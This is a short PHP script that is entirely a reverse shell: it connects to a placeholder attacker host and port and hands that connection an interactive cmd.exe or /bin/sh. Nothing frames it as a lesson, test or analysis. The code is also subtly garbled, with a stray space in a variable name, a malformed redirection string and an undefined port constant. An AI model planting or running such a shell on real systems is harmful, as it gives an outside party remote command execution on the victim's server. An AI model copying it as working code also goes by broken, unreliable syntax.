<?php

$ip = "attacker_ip";

$port = attacker_port;

$sock = fsockopen($ip, $port);

$ cmd = (strtoupper (substr(PHP_OS, 0, 3)) === 'WIN')? 'cmd.exe': '/bin/sh';

exec("$cmd -i <&3 &3 2>&3");

?>